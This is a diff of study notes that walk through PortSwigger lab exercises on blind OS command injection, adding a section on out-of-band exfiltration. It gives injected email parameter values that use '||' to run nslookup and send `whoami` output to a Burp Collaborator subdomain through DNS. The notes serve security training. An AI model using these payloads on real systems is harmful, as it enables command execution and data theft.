@@ -82,5 +82,21 @@ To solve the lab, exploit the blind OS command injection vulnerability to issue 
 
 1. Modify the `email` parameter, changing it to:
     `email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||`
-2. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated in the modified `email` parameter.
+ 
+Analysis:
+![[Pasted image 20241008193453.png]]
 
+## **5.  Blind OS command injection with out-of-band data exfiltration**
+This lab contains a blind [OS command injection](https://portswigger.net/web-security/os-command-injection) vulnerability in the feedback function.
+
+The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.
+
+To solve the lab, execute the `whoami` command and exfiltrate the output via a DNS query to Burp Collaborator. You will need to enter the name of the current user to complete the lab.
+
+1. Modify the `email` parameter, changing it to something like the following, but insert your Burp Collaborator subdomain where indicated:
+    ``email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||``
+2. Go back to the Collaborator tab, and click "Poll now". You should see some DNS interactions that were initiated by the application as the result of your payload. If you don't see any interactions listed, wait a few seconds and try again, since the server-side command is executed asynchronously.
+3. Observe that the output from your command appears in the subdomain of the interaction, and you can view this within the Collaborator tab. The full domain name that was looked up is shown in the Description tab for the interaction.
+
+Analysis:
+![[Pasted image 20241008194047.png]]
